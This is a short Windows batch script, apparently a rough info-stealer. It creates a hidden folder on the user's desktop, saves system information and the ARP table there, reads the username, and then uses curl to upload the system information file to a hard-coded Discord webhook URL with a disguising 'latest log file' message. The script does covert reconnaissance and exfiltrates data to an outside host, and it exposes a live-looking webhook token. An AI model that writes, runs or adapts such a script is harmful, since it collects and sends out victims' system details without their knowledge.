mkdir %userprofile%\desktop\bb
attrib +s +h +i +x %userprofile%\desktop\bb
systeminfo > %userprofile%\desktop\bb\systeminfo.txt
pause
arp -a > %userprofile%\desktop\bb\arp.txt
pause
for /f "delims=" %n in ('whoami') do set name=%n
curl -F "file=@%userprofile%\desktop\bb\systeminfo.txt" -F "content=Here's the latest log file!" "https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7"
pause
